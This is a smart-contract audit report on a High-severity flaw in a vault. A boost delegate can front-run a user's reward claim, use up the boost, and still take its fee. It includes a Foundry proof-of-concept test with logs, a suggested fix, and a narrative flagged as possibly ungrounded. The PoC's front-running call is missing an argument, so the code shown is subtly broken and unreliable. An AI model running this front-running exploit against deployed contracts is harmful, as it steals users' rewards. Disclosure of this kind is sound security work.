---
id: 4555
severity: "High"
---

# boostDelegate can steal reward from user due to insuﬃcient slippage protection Submitted by T1MOH

## Description

There is function Vault.batchClaimRewards(). It allows to claim Bima rewards using boost of boostDelegate. I.e. boostDelegate "sells" his boost for fee percent of claimed amount. It's pretty simple:
1. User claims Bima from different rewards tokens.
2. Instead of consuming his own boost, he uses boostDelegate.
3. User receives boosted amount and pays some fee to boostDelegate.
There is a protection to prevent boostDelegate from frontrunning and setting high fee, user can set maxFee he accepts:
```solidity
function batchClaimRewards(
address receiver,
address boostDelegate,
IRewards[] calldata rewardContracts,
uint256 maxFeePct // <<<
) external returns (bool success) {...}
```
```solidity
function _transferAllocated(
uint256 maxFeePct,
address account,
address receiver,
address boostDelegate,
uint256 amount
) internal {
// ...
if (boostDelegate != address(0)) {
// cache delegation data from storage
Delegation memory data = boostDelegation[boostDelegate];
// revert if delegation is not enabled
require(data.isEnabled, "Invalid delegate");
// copy callback address to working data
delegateCallback = data.callback;
// if fee in delegation data is max(uint16) then execute callback
// to get actual fee percent
if (data.feePct == type(uint16).max) {
fee = delegateCallback.getFeePct(account, receiver, amount, previousAmount, totalWeekly);
// enforce callback fee can't be greater than constant max fee
require(fee <= BIMA_100_PCT, "Invalid delegate fee");
}
// otherwise use fee percent in delegation data
else fee = data.feePct;
// enforce fee percent can't be greater than input max fee
require(fee <= maxFeePct, "fee exceeds maxFeePct"); // <<<
}
// ...
}
```
However boostDelegate can abuse current design and steal reward from honest users, here is attack scenario:
1. BoostDelegate has big weight and therefore big boostedAmount each week.
2. BoostDelegate wants to claim his rewards, hence consume boost.
3. However BoostDelegate conﬁgure his delegate params, let's say 10% fee.
4. User wants to claim big amount, however his own boost it too low. Therefore he uses BoostDelegate.
5. BoostDelegate frontruns User, and claims boost on his own.
6. User's transaction is executed. Delegate fee is 10% as previously, therefore check is successful. However all boost was consumed previously, therefore user receives only half of the expected amount. Moreover user pays 10% fee to BoostDelegate.
That is how any malicious user can honeypot innocent users and steal Bima from them. This attack doesn't require any preconditions. Basically any malicious user can employ such attack before claiming reward.
As a result user loses:
1. Potential reward from his own boost - instead it uses boostDelegate without boost. Loss is up to 50% of claimed amount.
2. Fee payed to boostDelegate for nothing.

## Proof of Concept

Initially make this change:
192 ~/projects/audit/PoC/bima-v1-core% git diff
diff --git a/test/foundry/dao/VaultTest.t.sol b/test/foundry/dao/VaultTest.t.sol
index 06a03b2..7bb3e48 100644
--- a/test/foundry/dao/VaultTest.t.sol
+++ b/test/foundry/dao/VaultTest.t.sol
@@ -10,6 +10,8 @@ import {BIMA_100_PCT} from "../../../contracts/dependencies/Constants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {console} from "forge-std/console.sol";
+
contract VaultTest is TestSetup {
uint256 internal constant MAX_COUNT = 10;
Insert this test into test/foundry/dao/VaultTest.t.sol:
```solidity
function test_custom13_T1MOH() public {
skip(20 weeks);
// 1. Lock Bima
address boostDelegate = makeAddr("boostDelegate");
uint128[] memory _fixedInitialAmounts;
IBimaVault.InitialAllowance[] memory initialAllowances = new IBimaVault.InitialAllowance[](2);
initialAllowances[0].receiver = users.user1;
initialAllowances[0].amount = 100e18;
initialAllowances[1].receiver = boostDelegate;
initialAllowances[1].amount = 100e18;
vm.startPrank(users.owner);
bimaVault.setInitialParameters(
emissionSchedule,
boostCalc,
INIT_BAB_TKN_TOTAL_SUPPLY,
INIT_VLT_LOCK_WEEKS,
_fixedInitialAmounts,
initialAllowances
);
vm.stopPrank();
vm.startPrank(users.user1);
bimaToken.transferFrom(address(bimaVault), users.user1, 100e18);
tokenLocker.lock(users.user1, 100, 52);
vm.stopPrank();
vm.startPrank(boostDelegate);
bimaToken.transferFrom(address(bimaVault), boostDelegate, 100e18);
tokenLocker.lock(boostDelegate, 100, 52);
vm.stopPrank();
// 2. Register receiver
uint256 RECEIVER_ID = incentiveVoting.receiverCount();
vm.prank(users.owner);
bimaVault.registerReceiver(mockEmissionReceiverAddr, 1);
mockEmissionReceiver.setReward(5.36870886875e26 * 2); // this amount is maxBoosted of boostDelegate
// 3. Vote
IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
votes[0].id = RECEIVER_ID;
votes[0].points = incentiveVoting.MAX_POINTS();
vm.prank(users.user1);
incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);
vm.prank(boostDelegate);
incentiveVoting.registerAccountWeightAndVote(boostDelegate, 52, votes);
// 4. Configure boostDelegate
uint16 maxFeePct = 1_000; // 10%
vm.prank(boostDelegate);
bimaVault.setBoostDelegationParams(true, maxFeePct, address(0));
skip(1 weeks);
vm.prank(mockEmissionReceiverAddr);
bimaVault.allocateNewEmissions(RECEIVER_ID);
// 6. User expects to receive this much:
(uint256 adjustedAmount, uint256 feeToDelegate) = bimaVault.claimableRewardAfterBoost(
users.user1,
users.user1,
boostDelegate,
mockEmissionReceiver
);
console.log("User expects to receive:");
console.log("adjustedAmount %e", adjustedAmount);
console.log("feeToDelegate %e", feeToDelegate);
// 7. BoostDelegate frontruns
IRewards[] memory rewardContracts = new IRewards[](1);
rewardContracts[0] = mockEmissionReceiver;
vm.prank(boostDelegate);
bimaVault.batchClaimRewards(
boostDelegate,
address(0),
rewardContracts,
);
console.log("------------");
(uint256 maxBoosted, uint256 boosted) = bimaVault.getClaimableWithBoost(boostDelegate);
console.log("BoostDelegate frontran and consumed boost:");
console.log("maxBoosted %e", maxBoosted);
console.log("boosted %e", boosted);
console.log("------------");
// 8. User's tx is executed
(adjustedAmount, feeToDelegate) = bimaVault.claimableRewardAfterBoost(
users.user1,
users.user1,
boostDelegate,
mockEmissionReceiver
);
console.log("User actually receives:");
console.log("adjustedAmount %e", adjustedAmount);
console.log("feeToDelegate %e", feeToDelegate);
}
```
Execute with forge test --match-test test_custom13_T1MOH -vv. Scenario in proof of concept:
1. User and BoostDelegate lock Bima.
2. New receiver is registered.
3. They vote for receiver.
4. Conﬁgure boostDelegate params.
5. Allocate new emissions.
6. User sends transaction and expects to receive logged amounts.
7. BoostDelegate frontruns and claims his own reward consuming boost.
8. User's transaction from step 6 is executed. He doesn't receive any boost and pays fee.
As a result boostDelegate earned fee for nothing, i.e. stole Bima from User.
Logs:
Ran 1 test for test/foundry/dao/VaultTest.t.sol:VaultTest
[PASS] test_custom13_T1MOH() (gas: 1330249)
Logs:
User expects to receive:
adjustedAmount 9.3952405203125e26
feeToDelegate 9.3952405203125e25
------------
BoostDelegate frontran and consumed boost:
maxBoosted 0e0
boosted 0e0
------------
User actually receives:
adjustedAmount 5.36870886875e26
feeToDelegate 5.36870886875e25
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.65ms (727.83µs CPU time)

## Recommendation

Refactor current slippage protection. Instead of maxFeePct you can use something like received amount percent which is receivedAmountAfterFee * 1e18 / claimedAmount. This ratio is 1e18 on maxBoost and decreases to 0.5 as boost is claimed, and it also includes delegate fee.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the reward‑claiming workflow of the Vault contract, specifically the batchClaimRewards function that allows a user to claim Bima rewards through a boostDelegate. The contract protects the user by letting them specify a maximum acceptable fee percentage (maxFeePct) and then checks that the delegate’s fee does not exceed this limit. However, the protection only validates the fee and never verifies that the boost amount the delegate promises is still available at the moment of the user’s claim. Because the boost amount is consumed on a first‑come‑first‑served basis, a malicious boostDelegate can front‑run a legitimate user, claim the entire boost for themselves, and then let the user’s transaction proceed. The fee check still passes because the delegate’s fee (e.g., 10 %) is within the user‑provided maxFeePct, but the boost that should have increased the user’s reward has already been exhausted. Consequently the user receives only the un‑boosted portion of the reward – often roughly half of the expected amount – and still pays the delegate fee, resulting in a net loss of up to 50 % of the claimed reward plus the fee. This attack can be performed by any participant with a large boost weight and does not require any special preconditions; it merely exploits the ordering of transactions in the mempool. From the user’s perspective the UI would show a successful claim transaction, but the received amount is far lower than anticipated and a fee is deducted, leading to confusion such as “my reward is missing” or “I paid a fee but got almost nothing”. The issue was uncovered during a security audit when a proof‑of‑concept test demonstrated that a boostDelegate could front‑run a user and steal Bima tokens. The flaw is subtle because the contract emits no explicit error – the fee validation succeeds – so the loss appears as a normal outcome rather than a revert. The root cause is an insufficient slippage protection model that only caps the fee percentage without accounting for the remaining boost capacity. To remediate, the contract should replace the maxFeePct check with a verification of the actual received amount after fee relative to the originally claimed amount (e.g., using a ratio of receivedAmountAfterFee * 1e18 / claimedAmount). This ratio stays at 1e18 when the full boost is available and drops proportionally as boost is consumed, ensuring that a user cannot be charged a fee when the boost has already been taken. In broader terms, the bug belongs to the class of front‑running‑prone economic logic errors where state‑dependent incentives are not atomically protected, leading to reward‑stealing scenarios and violation of the protocol’s accounting guarantees.
